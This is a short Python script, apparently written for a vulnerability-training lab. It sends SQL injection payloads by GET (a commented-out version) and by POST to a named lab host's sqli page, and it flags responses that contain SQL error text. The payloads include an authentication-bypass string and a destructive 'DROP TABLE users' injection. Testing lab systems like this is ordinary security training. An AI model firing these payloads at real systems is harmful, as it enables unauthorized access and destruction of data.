# import requests

# def test_sql_injection(url, payload):
#     try:
#         response = requests.get(url + payload)
#         if "SQL syntax" in response.text: #check for typical error message.
#             return True #vulnerable.
#         else:
#             return False
#     except requests.exceptions.RequestException as e:
#         print(f"Error: {e}")
#         return False

# base_url = "http://snf-3406.vlab.ac.ke/vulnerabilities/sqli/?id="
# payloads = ["' OR '1'='1", "'; DROP TABLE users;--"] #example payloads.

# for payload in payloads:
#     if test_sql_injection(base_url, payload):
#         print(f"SQL Injection vulnerability detected with payload: {payload}")
#     else:
#         print(f"No SQL Injection vulnerability detected with payload: {payload}")

import requests

def test_sql_injection_post(url, payload):
    try:
        data = {'id': payload, 'Submit': 'Submit'} #adjust the data to the correct form fields.
        response = requests.post(url, data=data)
        if "SQL syntax" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

base_url = "http://snf-3406.vlab.ac.ke/vulnerabilities/sqli/" #the base url to the sqli page.
payloads = ["' OR '1'='1", "'; DROP TABLE users;--"]

for payload in payloads:
    if test_sql_injection_post(base_url, payload):
        print(f"SQL Injection vulnerability detected with payload: {payload}")
    else:
        print(f"No SQL Injection vulnerability detected with payload: {payload}")